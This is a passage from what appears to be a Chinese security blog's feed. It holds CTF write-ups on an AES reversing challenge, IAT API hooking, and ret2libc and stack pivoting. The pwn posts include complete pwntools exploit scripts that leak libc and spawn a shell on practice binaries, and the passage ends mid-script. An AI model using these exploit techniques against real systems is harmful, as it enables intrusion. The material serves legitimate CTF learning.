class="number">0xE452B98D</span>, <span class="number">0xAA000D64</span>, <span class="number">0x48802D4B</span>, <span class="number">0xEC290C73</span>, <span class="number">0x17F0FFC3</span>, <span class="number">0x2785A657</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">decMain</span>(rkey, <span class="built_in">reinterpret_cast</span>&lt;BYTE*&gt;(c));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">åœ¨è¿™ä¸ªé¢˜ä¸Šè¢«å¡äº†ä¸€ä¸‹</summary>
    
    
    
    <category term="é¢˜é›†" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/"/>
    
    <category term="CTF" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/"/>
    
    <category term="æ¯”èµ›" scheme="https://www.pri87.vip/categories/%E9%A2%98%E9%9B%86/CTF/%E6%AF%94%E8%B5%9B/"/>
    
    
    <category term="re" scheme="https://www.pri87.vip/tags/re/"/>
    
    <category term="AES" scheme="https://www.pri87.vip/tags/AES/"/>
    
    <category term="çˆ†ç ´" scheme="https://www.pri87.vip/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ã€Šé€†æ ¸ã€‹0A-APIå‹¾å–</title>
    <link href="https://www.pri87.vip/posts/6dc52a20.html"/>
    <id>https://www.pri87.vip/posts/6dc52a20.html</id>
    <published>2025-01-10T15:32:25.000Z</published>
    <updated>2025-01-12T11:59:37.730Z</updated>
    
    <content type="html"><![CDATA[<h2 id="APIå‹¾å–">APIå‹¾å–</h2><p>å®é™…ä¸Šå°±æ˜¯å¯¹ç¨‹åºä½¿ç”¨çš„ç³»ç»ŸAPIè¿›è¡ŒHook</p><p><img src="https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png" alt="image-20250110233657957"></p><p>å¯ä»¥ä¿®æ”¹IAT/EAT/ä»£ç ï¼Œå¯¹äºç›´æ¥hookä»£ç ï¼Œå’Œä¹‹å‰çš„inlineHookä¸€æ ·<br>å¯¹äºIATï¼Œæ˜¯ç¨‹åºæ‰§è¡Œå¯¹åº”APIä»£ç æ—¶ï¼ŒIATä¼šå­˜æ”¾å¯¹åº”å‡½æ•°åç§»ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp cs:offset</span><br><span class="line">......</span><br><span class="line">offset çœŸå®åç§»</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™é‡Œçš„çœŸå®åç§»ï¼Œç„¶åè·³è½¬åˆ°è‡ªå·±çš„ä»£ç ä¸­ï¼Œæœ€åè·³è½¬åˆ°çœŸå®åç§»åœ°å€ã€‚</p><p>æœ¬è´¨ä¸Šè¿˜æ˜¯Hookï¼Œä½†æ˜¯è¦æ³¨æ„å‚æ•°çš„ä¼ é€’ï¼Œå…·ä½“å¯ä»¥çœ‹ä¹‹å‰çš„è°ƒç”¨çº¦å®šé‚£ä¸€ç¯‡æˆ–è€…å…·ä½“è°ƒè¯•åˆ†æã€‚</p><h2 id="å®è·µ">å®è·µ</h2><p>è¯¦è§ä¸‹é¢è¿™ä¸ªé¡¹ç›®ï¼š</p><p><a href="https://github.com/43287/AntiAntiDebug_plugin_for_IDA8.3">43287/AntiAntiDebug_plugin_for_IDA8.3: ä¸€ä¸ªåªæ”¯æŒx64çš„IDAåè°ƒè¯•æ’ä»¶</a></p><p>å…¶ä¸­ä½¿ç”¨äº†IAThookå’ŒInlineHook</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;APIå‹¾å–&quot;&gt;APIå‹¾å–&lt;/h2&gt;
&lt;p&gt;å®é™…ä¸Šå°±æ˜¯å¯¹ç¨‹åºä½¿ç”¨çš„ç³»ç»ŸAPIè¿›è¡ŒHook&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2025/01/10/YvLw8UG9QMeoKry.png&quot; alt=&quot;image-20250110</summary>
      
    
    
    
    <category term="é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="æŠ€èƒ½" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="Hook" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/Hook/"/>
    
    
    <category term="win" scheme="https://www.pri87.vip/tags/win/"/>
    
  </entry>
  
  <entry>
    <title>ret2libcä¸æ ˆè¿ç§»</title>
    <link href="https://www.pri87.vip/posts/26c65c86.html"/>
    <id>https://www.pri87.vip/posts/26c65c86.html</id>
    <published>2025-01-04T08:59:23.000Z</published>
    <updated>2025-01-04T09:06:09.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="RET2libc">RET2libc</h3><p>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªç¨‹åºä¸ä¼šæœ‰system(â€œbin/shâ€)è¿™ç§å±é™©ä»£ç è®©æˆ‘ä»¬ç›´æ¥getshellã€‚</p><p>ret2libcæ˜¯ä¸€ç§æ–¹æ³•ï¼Œè®©æˆ‘ä»¬å–å¾—å¤–éƒ¨åŠ¨æ€é“¾æ¥åº“(so)çš„åŸºåœ°å€ï¼Œå¹¶é€šè¿‡åŸºåœ°å€åŠ åç§»çš„æ–¹å¼è·å¾—ç›®æ ‡åº“å‡½æ•°çš„åœ°å€ï¼Œä»è€Œåœ¨ç¨‹åºæ²¡æœ‰ä¸»åŠ¨è°ƒç”¨ç›®æ ‡å‡½æ•°æ—¶ä¿®æ”¹retåœ°å€è¿”å›åˆ°æˆ‘ä»¬æƒ³è¦çš„åº“å‡½æ•°åœ°å€ã€‚</p><p>ç»ƒä¹ é¢˜ï¼š</p><p>æ‰“å¼€å…ˆchecksec</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">amd64-64-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="literal">No</span> <span class="string">canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x400000)</span></span><br></pre></td></tr></table></figure><p>æœ‰éƒ¨åˆ†RELROå’ŒNXä¿æŠ¤</p><p>vulnå‡½æ•°ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RET2LIBC &gt;_&lt;&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†ä¸€æ¬¡è¾“å‡ºï¼Œä¸€æ¬¡è¾“å…¥ï¼Œè¾“å…¥é•¿åº¦ä¸º112ï¼Œå¾ˆæ˜æ˜¾å¯ä»¥è¦†ç›–åœ°å€</p><p>ç¨‹åºæ²¡æœ‰bin/shå­—ç¬¦ä¸²å’Œsystemåœ°å€ï¼Œæ‰€ä»¥åªèƒ½è‡ªå·±æ³„æ¼å‡ºæ¥</p><p>gotè¡¨ä¼šå…ˆæŒ‰æ‰§è¡Œé¡ºåºç”Ÿæˆåœ°å€ï¼Œæ‰€ä»¥å…ˆè¿›å…¥mainåä¸€å®šä¼šå…ˆç”Ÿæˆ__libc_start_mainå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªå¾—åˆ°libcåŸºåœ°å€ç„¶ååŠ å¯¹åº”åç§»å¾—åˆ°systemå’Œbin/shåœ°å€ï¼Œæœ€åæ„é€ ropé“¾å»æ‰§è¡Œå‡½æ•°</p><p>é¡ºåºï¼š</p><p>vulnâ€“&gt;putsâ€“&gt;system</p><p>ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬æ§åˆ¶çš„åœ°å€åªæ˜¯æ ˆï¼Œä½†æ˜¯putså‡½æ•°çš„ä¼ å‚å´åœ¨å¯„å­˜å™¨é‡Œé¢ï¼Œè¯¥å¦‚ä½•æŠŠæ ˆä¸­çš„å€¼æ”¾åˆ°å¯„å­˜å™¨é‡Œå‘¢ï¼Œå¾ˆæ˜æ˜¾ï¼ŒpopæŒ‡ä»¤</p><p>å¯ä»¥çœ‹åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011E8     ; __unwind &#123;</span><br><span class="line">.text:00000000004011E8 000                 endbr64</span><br><span class="line">.text:00000000004011EC 000                 push    rbp</span><br><span class="line">.text:00000000004011ED 008                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011F0 008                 sub     rsp, 70h</span><br><span class="line">.text:00000000004011F4 078                 lea     rax, s          ; &quot;RET2LIBC &gt;_&lt;&quot;</span><br><span class="line">.text:00000000004011FB 078                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004011FE 078                 call    _puts</span><br><span class="line">.text:0000000000401203 078                 lea     rax, [rbp+var_70]</span><br><span class="line">.text:0000000000401207 078                 mov     rdi, rax</span><br><span class="line">.text:000000000040120A 078                 mov     eax, 0</span><br><span class="line">.text:000000000040120F 078                 call    _gets</span><br><span class="line">.text:0000000000401214 078                 nop</span><br><span class="line">.text:0000000000401215 078                 leave</span><br><span class="line">.text:0000000000401216 000                 retn</span><br><span class="line">.text:0000000000401216     ; &#125; // starts at 4011E8</span><br><span class="line">.text:0000000000401216     vuln            endp</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¼ ç»™putsçš„å€¼æ˜¯rdi</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ret2libc --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>ç”¨gadgetçœ‹çœ‹ï¼Œå‘ç°0x00000000004011e3 : pop rdi ; ret<br>å¦‚æœå…ˆè¿”å›è¿™ä¸ªåœ°å€ï¼Œå°±å¯ä»¥æŠŠå†™å…¥æ ˆçš„æ³„éœ²åœ°å€ç»™rdiï¼Œç„¶åæ‰§è¡Œåé¢çš„æ“ä½œ</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">e = ELF(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">payload1 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span>+p64(<span class="number">0x00000000004011e3</span>)+p64(libc_start_main_got)+p64(<span class="number">0x401060</span>)+p64(<span class="number">0x401090</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libc_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_main_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_main_addr)</span><br><span class="line">libcbase = libc_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">puts_addr = libcbase + libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0x78</span>*<span class="string">b&#x27;a&#x27;</span> +p64(<span class="number">0x000000000040101a</span>)+p64(<span class="number">0x00000000004011e3</span>)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RET2LIBC &gt;_&lt;&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ ˆè¿ç§»">æ ˆè¿ç§»</h3><p>æ‰“å¼€taské¢˜ç›®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know Stack_Pivoting?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000401221</span>     main            proc near               ; DATA XREF: _start+<span class="number">18</span>â†‘o</span><br><span class="line">.text:<span class="number">0000000000401221</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000401221</span> <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">0000000000401225</span> <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000401226</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">0000000000401229</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">000000000040122</span>E <span class="number">008</span>                 call    init</span><br><span class="line">.text:<span class="number">0000000000401233</span> <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401238</span> <span class="number">008</span>                 call    vuln</span><br><span class="line">.text:<span class="number">000000000040123</span>D <span class="number">008</span>                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000401242</span> <span class="number">008</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401243</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000401243</span>     ; &#125; <span class="comment">// starts at 401221</span></span><br><span class="line">.text:<span class="number">0000000000401243</span>     main            endp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004011</span>DB     ; <span class="type">void</span> <span class="title function_">gadget</span><span class="params">()</span></span><br><span class="line">.text:00000000004011DB                     public gadget</span><br><span class="line">.text:00000000004011DB     gadget          proc near</span><br><span class="line">.text:00000000004011DB     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004011</span>DB <span class="number">000</span>                 endbr64</span><br><span class="line">.text:<span class="number">00000000004011</span>DF <span class="number">000</span>                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004011E0</span> <span class="number">008</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">00000000004011E3</span> <span class="number">008</span>                 pop     rdi</span><br><span class="line">.text:<span class="number">00000000004011E4</span> <span class="number">000</span>                 retn</span><br><span class="line">.text:<span class="number">00000000004011E4</span>     gadget          endp</span><br><span class="line">.text:<span class="number">00000000004011E4</span></span><br><span class="line">.text:<span class="number">00000000004011E4</span>     ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">00000000004011E5</span>                     align <span class="number">2</span></span><br><span class="line">.text:<span class="number">00000000004011E6</span>                     pop     rbp</span><br><span class="line">.text:<span class="number">00000000004011E7</span>                     retn</span><br><span class="line">.text:<span class="number">00000000004011E7</span>     ; &#125; <span class="comment">// starts at 4011DB</span></span><br></pre></td></tr></table></figure><p>ä¾ç„¶æ²¡æœ‰bin/shå’Œsystemï¼Œæ‰€ä»¥ä¾ç„¶éœ€è¦ret2libc</p><p>ä½†æ˜¯è§‚å¯Ÿreadå‡½æ•°å¯ä»¥å‘ç°ï¼Œå¯ä»¥å†™å…¥0x50ï¼Œæ•°ç»„é•¿åº¦0x40ï¼Œæ‰€ä»¥åªèƒ½å†™å…¥2ä¸ªåœ°å€å»è¦†ç›–ï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾æ˜¯ä¸å¤Ÿçš„ï¼Œ<br>ç„¶åçœ‹çœ‹æœ‰æ²¡æœ‰å¯èƒ½ä¿®æ”¹0x50è¿™ä¸ªæ•°ï¼Œå‘ç°æ²¡æœ‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary stack_pivoting --only &#x27;pop|ret&#x27;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040115d : pop rbp ; ret</span><br><span class="line">0x00000000004011e3 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br></pre></td></tr></table></figure><p>å¦‚æœæŒ‰ä¸Šä¸€ä¸ªé¢˜(ret2libc)ä¸¤æ¬¡åˆ†åˆ«éœ€è¦å†™å…¥ï¼š</p><p>pop_rdi+libcåœ°å€+putsåœ°å€+startåœ°å€<br>pop_rdi+bin/shåœ°å€+systemåœ°å€</p><p>å¯¹äº16å­—èŠ‚ï¼Œè¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œæ‰€ä»¥ä¸å¦¨æ¢ä¸ªæ€è·¯ï¼Œå¦‚æœå†™å…¥çš„å†…å®¹åŒºåŸŸä¸èƒ½æ”¹å˜ï¼Œé‚£è¦æ˜¯å¯ä»¥æ”¹å˜rspæŒ‡é’ˆä¹Ÿå¯ä»¥ï¼Œå¦‚æœç®—ä¸Šæ‰€æœ‰çš„ç©ºé—´ï¼Œæœ‰0x50ä¸ªï¼Œè¿™æ ·å°±å¤Ÿäº†ï¼Œåªè¦æƒ³åŠæ³•æŠŠrspæ”¾åˆ°è¿™ä¸ªç©ºé—´å¼€å¤´å°±å¥½äº†</p><p>èƒ½ä¿®æ”¹rspçš„æŒ‡ä»¤æ˜¯leave<br>æ•ˆæœæ˜¯ï¼šmov rspï¼Œrbpï¼›pop rbp</p><p>ä½†æ˜¯è¿™ä¸ªæŒ‡ä»¤åªèƒ½ä½¿å¾—rspæŒ‡å‘rbpæŒ‡å‘çš„åœ°å€ï¼Œå› æ­¤ï¼Œåœ¨æ ˆè¿ç§»ä¸­ï¼Œrbpå°±ç±»ä¼¼ä¸€ä¸ªå¼•å­ï¼Œé€šè¿‡ä¿®æ”¹rbpçš„å€¼é—´æ¥ä¿®æ”¹rspçš„å€¼ã€‚æ¯æ¬¡leaveä¹‹åï¼Œéƒ½ä¼špop rbpï¼Œä¸€å®šæ³¨æ„è¿™é‡Œpopå‡ºçš„åœ°å€å°±æ˜¯rspä¸‹æ¬¡çš„åœ°å€ã€‚å¯¹äºè¿™ä¸ªé¢˜ï¼Œæ¯æ¬¡å¯å†™çš„åŒºåŸŸæ˜¯rbpä¹‹ä¸Šçš„å†…å®¹(rbp-0x40)å’Œrbpä¸‹æ¬¡çš„åœ°å€å’Œretåœ°å€</p><p><img src="https://s2.loli.net/2025/01/04/TE8YqDnzmgLeG1O.png" alt="image-20250103235741084"></p><p>å¦‚æœè¿™æ ·å†™å…¥ï¼Œä¼šç›´æ¥è·³è¿‡ropé“¾(å› ä¸ºreadä¹‹åç›´æ¥leaveäº†)ç„¶årspå°±åˆ°ä¸‹é¢äº†ï¼Œè¿™æ ·æ— æ³•å®ç°æ‰§è¡Œçš„æ•ˆæœï¼Œä½†æ˜¯æ¯æ¬¡readä¹‹åå¿…ç„¶æ˜¯retï¼Œæ‰€ä»¥è¿™æ—¶éœ€è¦ä¸€ä¸ªæ–¹æ³•æŠŠrspæ”¾åˆ°ä¸Šé¢å»</p><p><img src="https://s2.loli.net/2025/01/04/6lG5YXwLsKqk9RT.png" alt="image-20250103235925955"></p><p>åˆšåˆšè¯´äº†ï¼Œrbpæ˜¯rspçš„å› å­ï¼Œæƒ³è¦ä¿®æ”¹rspå¿…é¡»å…ˆä¿®æ”¹rbpï¼Œç„¶åå†leaveï¼Œå› æ­¤å¯ä»¥é€šè¿‡å…ˆæŠŠrbpæ”¾åˆ°é“¾é¦–ç„¶åå†leaveçš„æ–¹å¼ä¿®æ”¹rspçš„å€¼</p><p><img src="https://s2.loli.net/2025/01/04/GPSFt8zlbeoc6XV.png" alt="image-20250104002905805"></p><p>æ‰§è¡Œleave_retä¹‹å</p><p><img src="https://s2.loli.net/2025/01/04/iIyVZDQMsn3vkHp.png" alt="image-20250104003447718"></p><p>leave_retè¿˜æœ‰ä¸€ä¸ªretï¼Œå¯ä»¥ç›´æ¥è§¦å‘ropé“¾</p><p>é‚£ä¹ˆï¼Œæµç¨‹æ˜¯è¿™æ ·çš„ï¼š</p><p>æ ˆè¿ç§»+è§¦å‘ç¬¬ä¸€æ¬¡çš„ropé“¾+æ ˆè¿ç§»+è§¦å‘ç¬¬äºŒæ¬¡rop</p><p>æ³¨æ„ï¼šåœ¨systemå‡½æ•°ä¸­rspå€¼ä¼šå‡0x338ï¼Œè¦ç•™å¤Ÿç©ºé—´ï¼Œå®é™…ç»™äº†0x800ã€‚readå‡½æ•°è¯»å–å€¼æ—¶å‚æ•°åœ¨æ ˆä¸Šï¼Œä¸èƒ½è¢«è¦†ç›–ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡ç»™å€¼åéœ€è¦æŠŠä¸‹æ¬¡çš„rbpæ”¾åˆ°æ›´åé¢çš„ä½ç½®(å€¼æ›´å¤§)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">name = <span class="string">&quot;./stack_pivoting&quot;</span></span><br><span class="line"></span><br><span class="line">new_rbp = <span class="number">0x4040A0</span>+<span class="number">0x800</span> <span class="comment">#åˆ†é…è¶³å¤Ÿå¤§çš„ç©ºé—´</span></span><br><span class="line">e = ELF(name)</span><br><span class="line">pPop_rdi = p64(<span class="number">0x4011E3</span>)</span><br><span class="line">pStart = p64(e.symbols[<span class="string">&#x27;_start&#x27;</span>])</span><br><span class="line">pRet = p64(<span class="number">0x4011E4</span>)</span><br><span class="line">pLeave_ret = p64(<span class="number">0x40121F</span>)</span><br><span class="line">pDataBef = p64(new_rbp-<span class="number">0x40</span>)</span><br><span class="line">pData = p64(new_rbp)</span><br><span class="line">pDataNext = p64(new_rbp+<span class="number">0x40</span>)</span><br><span class="line">pReadbuf = p64(<span class="number">0x401203</span>)</span><br><span class="line">pPuts = p64(<span class="number">0x401064</span>)</span><br><span class="line">libc_start_main_got = e.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p = process(name)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Do you know Stack_Pivoting?&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å½“rbpä¿®æ”¹å,ä½¿ç”¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop1</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#æœ€å‰é¢ç•™rbpè¿”å›åˆ°å¼€å§‹çš„é‚£ä¸ªåœ°å€</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pDataBef + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendRop2</span>(<span class="params">p,rop</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(rop)!=<span class="number">0x38</span>:<span class="comment">#æœ€å‰é¢ç•™rbpè¿”å›åˆ°å¼€å§‹çš„é‚£ä¸ªåœ°å€</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len_not_right&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line">    rop = pDataNext + rop + pData + pLeave_ret</span><br><span class="line">    p.send(rop)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span 